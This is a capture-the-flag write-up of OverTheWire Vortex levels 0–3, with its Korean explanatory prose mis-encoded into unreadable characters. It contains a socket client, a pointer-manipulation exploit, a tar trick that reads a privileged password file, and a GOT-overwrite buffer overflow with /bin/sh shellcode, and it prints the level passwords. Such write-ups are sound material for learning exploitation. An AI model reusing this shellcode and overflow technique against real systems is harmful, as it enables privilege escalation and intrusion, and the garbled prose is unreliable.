# vortex Level 0 )
#### ����) 
Your goal is to connect to port 5842 on vortex.labs.overthewire.org and read in 4 unsigned integers in host byte order.<br>
Add these integers together and send back the results to get a username and password for vortex1.<br>
This information can be used to log in using SSH.<br>
#### ���� Ǯ��) 
Python�ڵ带 �̿��Ͽ� ������ �ذ��ߴ�.<br>
������ �����Ͽ� ������ ���� ���� Integer 4���� ���Ͽ� �޼����� ������, ���� �˷��ִ� ������� �����ϰ� �ִ�.<br>
��Ʈ��ũ ����Ʈ ������ �˾ƾ� �Ѵ�.<br>
Intel x86�� ��Ʋ ����� ����� ����ϸ�, ��Ʋ ����� ����� �޸��� ù �ּҿ� ����������(�������� �� ������)���� �����Ѵ�.<br>
���� �����ϸ� �޾ƿ��� ���� Big endian���� ��ȯ�ϰ�, ��� �Ŀ� �ٽ� Little Endian ������� �����ָ� �ȴ�.<br><br>

�ϴ� ���� ���α׷����� �� �Ŀ� � �����͸� �޾ƿ��� �� Ȯ���ߴ�.(��ȣ ���� "����"�̱⿡ 4����Ʈ�� �޾ƿԴ�.)<br>
![���޾ƿ���](./imgs/level0/0.PNG)<br>
�ݺ� �����ϴ�, ���� �ٲ�� ���� Ȯ�� �� �� �־���.<br>
�� ���� ��� ���� ����Ͽ� �������� ������ ���� ���� �� ����δ�.<br>
Python Little Endian �̶�� ���ۿ� �˻��ϴ�, Struct��� ����� ��õ���־���.<br>
Struct ����� ������ ������ �� ������� �����ߴ�.<br>
![Ʃ������](./imgs/level0/1.PNG)<br>
�׸��� ���� Ʃ�� �������� �޾ƿ´�. [0]�� ���� �ʿ��ϴ� ������ �Ŀ� ���.<br>
��������� ���� �� ����ϴ� �� Ȯ���ߴ�.<br>
![�ߴ�����](./imgs/level0/2.PNG)<br>
�� ����������, Send�� ������ �ȴ�. ���� ����� �� �� ����� �������� �ٲ����� ��Ʋ ����� �������� �ٲ� �� ��������Ѵ�.<br>
�׷����� ���� ���ƿԴ�.<br>
![��](./imgs/level0/3.PNG)<br>

```python
import socket
import struct

#������ �ּ�
HOST = 'vortex.labs.overthewire.org'
# ��Ʈ ��ȣ
PORT = 5842

result = 0 # ��ȣ ���� ���� 4���� ���� ����
big = None # Big Endian�� ������ ����


#���� ��ü ����
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#������ ����
client_socket.connect((HOST,PORT))

#�޼��� 4�� ����, �򿣵������ ��ȯ �� ������ ���
for i in range(0,4):
    data = client_socket.recv(4)
    big = struct.unpack('<I', data)[0]
    result += big
    
    
#��Ʋ ��������� ������ ��ȯ ��, �޼��� ����
client_socket.send(struct.pack('<I',result))

#�� �޾ƿ���
print(client_socket.recv(1024))

# ���� �ݱ�
client_socket.close()
```
Struct ��ü�� �򰥸� �� �ֱ⿡ ��� �����Ѵ�.<br>
Struct ��ü���� ���� ���� ���� �� ��� Little Endian���� ����ϴ� ����� ���δ�.<br>
``` python
big = struct.unpack('<I', data)[0] #���� �� ��Ʋ ����𿡼� �� ��������� ��ȯ

client_socket.send(struct.pack('<I',result)) # ���� �� ��Ʋ ����� ��ȯ
```
������ �� �ִ� �κ���, ��Ʋ ������� �� ��������� �ٲ� �� ">I"�� ��ȯ�ϴ� ���� �ƴϴ�.<br>
�װͿ� ���� ������ ����� �����ߴ�.<br>

``` python
import struct

lUP = struct.unpack("<I",b'\x03\x02\x01\x00')[0]
bUP = struct.unpack(">I",b'\x00\x01\x02\x03')[0]
 
print("Little Endian : "+str(lUP)+"\nBig Endian : "+str(bUP))

lP = struct.pack("<I", lUP)
bP = struct.pack(">I", bUP)

print("Little Endian : "+str(lP)+"\nBig Endian : "+str(bP))

lUP = struct.unpack("<I",lP)[0]
bUP = struct.unpack(">I",bP)[0]

print("Little Endian : "+str(lUP)+"\nBig Endian : "+str(bUP))

```
���� ����� �̷���.<br>

![struct_Little_Endian](./imgs/level0/4.PNG)<br>

#### �� == _Username: vortex1 Password: Gq#qu3bF3_ 




# vortex Level 1 )
#### ����) 
We are looking for a specific value in ptr. You may need to consider how bash handles EOF..

Included file: vortex1.c
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

#define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }

void print(unsigned char *buf, int len)
{
        int i;

        printf("[ ");
        for(i=0; i < len; i++) printf("%x ", buf[i]); 
        printf(" ]\n");
}

int main()
{
        unsigned char buf[512];
        unsigned char *ptr = buf + (sizeof(buf)/2);
        unsigned int x;

        while((x = getchar()) != EOF) {
                switch(x) {
                        case '\n': print(buf, sizeof(buf)); continue; break;
                        case '\\': ptr--; break; 
                        default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;
                }
        }
        printf("All done\n");
}
```
#### ���� Ǯ��) 
�ڵ尡 �־����鼭 ptr�� Ư���� ���� ã�� �ִٰ� �ϳ׿�.<br>
�ڵ忡�� ���� �˰ڵ��� ptr�� ���� �κ��� \xca �̸� ������ �����Ͽ� ���� �����ϴ� �� �����ϴ�.<br>
�ϴ� File�� gdb�� ������غ����� �սô�.<br>
![Vortex1](./imgs/level1/Ȩ���丮�������.PNG)<br>
��ɾ �Է��ϰ� Ȯ�������� Ȩ���丮���� �ƹ��͵� ������.<br>
setuid�� �ɸ� ������ ã�ƾ��մϴ�. find ��ɾ�� ã������ϴ�.<br>
![Vortex1](./imgs/level1/setuid����ã��.PNG)<br>
�� ã�ҽ��ϴ�. �ش� ���丮�� ������ �� ������ Ȯ���� �� �ֽ��ϴ�<br>
![Vortex1](./imgs/level1/vortex����.PNG)<br>
gdb�� �̿��Ͽ� ������� �ڵ带 ����ý��ϴ�.<br>
![GDB_�̿��Ͽ������](./imgs/level1/disas_main.PNG)<br>
������� �ڵ�� �߿� ptr�� �����ּҿ�, ������ �����ּ�,�׸��� ���� ptr�� ����Ű�� �ִ� �κ��� ã�ƾ��մϴ�.<br> 
![GDB_�̿��Ͽ������](./imgs/level1/512+����.PNG)<br>
�ϴ� �ڵ带 ���� buf�� 512�̶�� ������ �Ҵ��߰�, dummy�� �߰��� ������ ���ÿ��� Ȯ���߽��ϴ�.<br>
![GDB_�̿��Ͽ������](./imgs/level1/gdb_buf_address.PNG)<br>
�׸��� �ؿ��� eax�������Ϳ� [esp + 0x1c]�� lea��ɾ�� �ּҰ� ���� �� �� �ֽ��ϴ�.<br>
�׹ؿ� add�� eax ������ 0x100�� �����ִ±���. 0x100�� 10������ 256����Ʈ�Դϴ�. �׸��� �� ���� [esp + 0x14]�κп� �־��ֳ׿�.<br>
�ʿ��� �ּҴ� �� ���߽��ϴ�.<br>
1. buf�� ���� �ּ� == esp + 0x1c
2. ptr�� ���� �ּ� == esp + 0x14
3. ptr�� ����Ű�� �ּ� == esp + 0x1c + 0x100<br>

gdb�� ��ɾ��� x/x�� �̿��ؼ� Ȯ���� ���ڽ��ϴ�.<br>
![GDB_�̿��Ͽ������](./imgs/level1/gdb0.PNG)<br>
�ּҸ� Ȯ���� �� ������� ������ �� �Ŀ� �극��ũ ����Ʈ�� �ɾ� �ּҸ� Ȯ���ؾ� ��Ȯ�� ���� �� �־�, main+92 �κп� �극��ũ ����Ʈ�� �� �Ŀ� �����߽��ϴ�.<br>
![GDB_�̿��Ͽ������](./imgs/level1/gdb1.PNG)<br>
![GDB_�̿��Ͽ������](./imgs/level1/gdb2.PNG)<br>
ptr�� ���� �ּҴ� 0xffffd534�׿�. 0xffffd63c���� �� �ִ� �κ��� ���Դϴ�. ���⼭ �츰 ���� ff�κ��� ca�� �ٲ�߰���.<br>
���⼭ ��Ʋ ��������� ���� ������, ff�� ��ġ�� +3 �κп� �־�����ϰڽ��ϴ�. ������ �´��� Ȯ���غ���.<br>
![GDB_�̿��Ͽ������](./imgs/level1/gdb2_1byte.PNG)<br>
![GDB_�̿��Ͽ������](./imgs/level1/gdb2_1byte_result.PNG)<br>
Ȯ���ϳ׿�. �� �̰��� \xca�� �־��ֱ�� �ϰ�, buf�� �����ּҸ� Ȯ���غ��ô�.<br>
![GDB_�̿��Ͽ������](./imgs/level1/buf�ּ�.PNG)<br>
buf�ּҵ� ã������ ptr�� ���� ����Ű�� �ִ� ���� 0xffffd53c+100 �̰�, �̰����� ptr�� ���� ��ġ���� ���Ϸ��� (0xffffd53c+100)-0xffffd534 �� �Ÿ��� ���� �� �ֽ��ϴ�.<br>
264ĭ ������ �ֳ׿�. ���⼭ ���� �� ����, �츮�� ���� ���� ��ġ�� esp+14+3�� ��ġ�� ���̾����ϴ�. 264-3�� ���ִ� ������ �־���߰ڳ׿�.<br>
��, �� ���߽��ϴ�. ���̷ε带 �ۼ��ϸ� �˴ϴ�.<br>
_(python -c 'print "\\" * 261 + "\xca"'; cat) | ./vortex1_ <br>
�̷����ϸ� ���� ȹ���Ͻ� �� �ֽ��ϴ�.<br>
���⼭ �� cat�� �־����Ŀ� ���� �亯�� ������ �Բ� ����ϴ�. <br>
���ڵ带 ����ؼ� ���̷ε带 �ۼ��� ��, ���̼� ��ũ��Ʈ�� ����ϴ� �������� EOF�� �ڵ����� �߰��ϱ� �����Դϴ�.<br>
[�� cat�̶�� ��ɾ �־��°�? - ������](https://satanel001.tistory.com/82)<br>
![���̷ε�](./imgs/level1/���̷ε�.PNG)<br>
���̷ε带 �־��ָ� ���ڵ尡 ����ǰ� password�� ���� �� �ֽ��ϴ�.<br>


������ �ı� : Vortex�� Ǯ�̿� �ð��� �ɸ���.<br>
Bandit�� linux �ٷ�µ��� ������ �α⿡ �����ϰ�, FTZ���� �� ���� ����� �� ����.<br>
�׷��� ���� ����!<br>

#### �� == _23anbT\rE_ 






# vortex Level 2 )
#### ����) 
```C
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>


int main(int argc, char **argv)
{
        char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
        execv(args[0], args);
}
```
#### ���� Ǯ��) 
�ҽ� �ڵ带 ���� tar ��ɾ �����ϴ� ���� �� �� �ִ�.<br>
���� ���� ��ƺ��� 0���� ���ڴ� tar�� ���� ��ġ, 1��°�� �ɼ�, 2��°�� ���ٰ� ��� ������ ������ �����ϴ� ���̴�.<br>
![Vortex2](./imgs/level2/0.PNG)<br>
���������� Ȩ ���丮�� ã�ƺ� �Ŀ�, setuid ������ ã�Ҵ�.<br>
![Vortex2](./imgs/level2/1.PNG)<br>
�ϳ��� setuid�� �־� �ڼ��� ���� ���Ҵ�. vortex3�� ������ ������ �ְ�, ���� �ҽ��ڵ�� ���� ����� �ϴ�, �� ���Ϸ� �����ϸ� ������ �ǰڴ�.<br>
![Vortex2](./imgs/level2/2.PNG)<br>
�������� �³� Ȯ���غ���, �¾Ҵ�. ���� ������ �����ϴ� �� ������ ���ٰ� �ȵȴٰ� �Ѵ�.<br>
Vortex3�� ������ ������ ������, �� �������ϰ� �Բ� Vortex3�� ��й�ȣ�� ��� ������ �����ϸ� �ǰڴ�.<br>
![Vortex2](./imgs/level2/3.PNG)<br>
"/"�� ������ �Ͻô�, /etc/vortex_pass�� ���� ./vortex3�� �о������ ����.
![Vortex2](./imgs/level2/4.PNG)<br>
��ɾ �� ����Ǿ���. /tmp/ownership.$$.tar�� �߸���� ���� ���̴�. Ȯ���غô�.<br>
![Vortex2](./imgs/level2/5.PNG)<br>
cat���� �о���� ������ ����, �� ������ $$�� 55�� �а��ִ� ����̴�. $���ڸ� \�� �߰��Ͽ� �����ϰ� �������.<br>
![Vortex2](./imgs/level2/6.PNG)<br>
��й�ȣ�� ������ ���� Ȯ���� �� �ִ�.<br>
���߿��� ������ ��й�ȣ�ϱ�? �ǹ��� �� �� �ֱ⿡ �� ���� ������ �ߴ�.<br>
����� ������ ���� �����غ��� �ȴ�.<br>
t1.txt���� "go!"�� t2.txt���� "dong"�� �־�ΰ� tar�� �����ߴ�.<br>
�׸��� cat�� Ȯ���غ� ���.<br>
![Vortex2](./imgs/level2/7.PNG)<br>
Dong�� vortex2vortex2dong �̶�� ������ ���� �� �� �ִ�.<br>
�׷� ��й�ȣ�� .


#### �� == _64ncXTvx#_ 



# vortex Level 3 )
#### ����)
```C
/*
 * 0xbadc0ded.org Challenge #02 (2003-07-08)
 *
 * Joel Eriksson <je@0xbadc0ded.org>
 */

#include <string.h>
#include <stdlib.h>
#include <stdio.h>

unsigned long val = 31337; //�������� ��� �� == 0x7a69
unsigned long *lp = &val; //��������, Val�� �ּҸ� ������ ����.

int main(int argc, char **argv)
{
        unsigned long **lpp = &lp, *tmp; //**ipp�� *ip�� �ּҸ� ����Ŵ, unsigned long *tmp ����.
        char buf[128]; // 128byte ���ڿ� ����

        if (argc != 2) //���ڰ� 2���� �ƴϸ� ���� �Ұ�
                exit(1);//���� �߻�

        strcpy(buf, argv[1]); //argv[1]���� buf�� ���� -> BOF

        if (((unsigned long) lpp & 0xffff0000) != 0x08040000) //ipp�� ��Ʈ and�� ���� �ʱ�ȭ. Ʋ���� �����߻�.
                exit(2);

        tmp = *lpp; // *tmp�� *ip�� ����Ŵ
        **lpp = (unsigned long) &buf; //**ipp �� buf�� �ּҸ� ����Ŵ == ���� ���� val�� buf�� �ּҰ� ��.
        // *lpp = tmp; // Fix suggested by Michael Weissbacher @mweissbacher 2013-06-30

        exit(0); //���� ����
}
```


#### ���� Ǯ��) 
�̹� ������ �ٽ��� GOT Overwrite����.<br>
.ctors / .dtors��  ����� �� ���� ���� �ִٱ淡 ������� ���� ���� �˾Ҵ�.<br>
�ʹ� ����� �ٸ� ����� ������ �������� ��, .dtors�� ����ϴ���.<br>
�ٵ� ���� �ٸ� ������� �ذ��ϱ�� �ߴ�. �� ����� GOT����.<br>
Lazy Binding ������ �˾ƾ� �ذ��� �� �ֱ⿡, �׿� ���õ� ������ ã�� ������ �� �����ߴ�.(Lazy_binding.md�� ������ ����)<br>
�Լ��� �ּҸ� �������� �������� GOT(Global Offset Table)�� �̿��Ѵ�.<br>
�Լ��� �����Ҷ� plt���� got�� �ּҸ� �˾ƿ��µ�, �̶� Got�� �ּҸ� �츮�� ���ϴ� ������ �ٲٸ� �װ��� �ҷ�������.<br>

�ڵ带 �м��� �� ���� �����Ͱ� ���ͼ� ���� �򰥸��� �������.<br>
�ϴ� BOF�� ����Ű�� ���ؼ� buf�� **ipp�� �ּ��� �Ÿ��� �˾ƾ��ߴ�.<br>
![Vortex3](./imgs/level3/0.PNG)<br>
�ҽ� �ڵ带 ã��, GDB�� ������� �ߴ�.<br>
![Vortex3](./imgs/level3/1.PNG)<br>
<+ 12>�� ���� [esp + 0x9c]�� 0x8049748 �ּҿ� �ִ� ���� �ְ� �ִ�.<br>
�����ϸ�, *ip�� �ּ��̰� Val�� �ִ� ���� �ְ� �ִ� �� ����.<br>
���� �������� **ipp�� �ּҶ� �Ҹ�.<br>
Ȯ���غô�.<br>
![Vortex3](./imgs/level3/2.PNG)<br>
Ȯ���� ���������� ip�� val��� �˷��ְ� �ִ�.<br>
7a69�� 10������ 31337�̴�.<br>
[esp + 0x9c]�� Ȯ���ϰ� **ipp�� ��ġ�� ���� ã�Ҵ�.<br>
�������� ã�ƾ� �� ���� buf�� ���� �ּҴ�.<br>
�̰��� ���� ã�� �� �ִµ�, strcpy�Լ��� �����ϱ��� lea ��ɾ�� �ּҸ� eax�� �����ϴ� ���� �� �� �ִ�. <br>
[esp+0x18]�� buf�� �����ּҴ�.<br>
0x9c - 0x18 == 132��.<br>
![Vortex3](./imgs/level3/3.PNG)<br>
Ȯ���� 132�� �Ÿ���ŭ ������ �ִ�.<br>
���� ���̷ε带 �ۼ��� �� ���� �� ����.<br>
������ ¤�� �Ѿ�� �� �κ��� �ִ�.<br>
![Vortex3](./imgs/level3/4.PNG)<br>
�� �̹����� ���� ���׸�Ʈ ������ �߻����� �ʰ� �׳� �����Ű�µ� �� ������ �ڵ� ���� �����̴�.<br>
```C
if (((unsigned long) lpp & 0xffff0000) != 0x08040000)
                exit(2);
```
���� �츮�� Ipp�� �ּҸ� 41414141�� �ٲ�� ������ & ��Ʈ ������ �̷����� ���� 41410000�� �Ǳ⿡ ������ �������� �ʴ´�.<br>
0x0804�� �� �� �־�߰ڴ�.<br>
�ٽ� �ڵ带 �м��غ��� ������ exit�Լ��� �����ϸ� �����Ѵ�.<br>
exit�Լ��� ȣ��� ��, got���� ������ �ִ� plt+2�� �ּҸ� ipp�� ����Ű�� �ִٸ�?<br>
**ipp�� &buf�� �ּҸ� ������ �Ǳ� ������ ���ڵ带 ������ ���̴�.<br>
![Vortex3](./imgs/level3/5.PNG)<br>
plt�� �����ϸ� �ٷ� jmp�� �ϰ� �ֱ� ������, plt+2 �κп� got�� �ּҰ� ����ִ�.<br>
�� �ּҸ� ipp�� ����Ű�� �Ϸ��� �� �ȿ� ������� �� ��.<br>
���̷ε�� [���ڵ�] + [Adummy] + [got�ּ�] == 136����Ʈ�� �Ǿ߰ڴ�.<br>
���̷ε�<br>
```
./vortex3 $(python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"A"*85+"\x12\x83\x04\x08"')
```
�ۼ��� ���̷ε�� �̷���.<br>
![Vortex3](./imgs/level3/6.PNG)<br>
���������� ���� ������ ����� Ȯ���� �� �ִ�.<br>
�� GOT overwrite�� ���� �����ؾ��� �ʿ並 ������.<br>
������ �� ����������, Vortex�� ���������� ��(5���̻�)�� �ɸ��� ������ ��� ������ ��ƴ�.<br>
vortex�� ������ �ȳ����� ������ �ϳ���.<br>
����, ���� �ɷ�...<br>

#### �� == _2YmgK1=jw_ 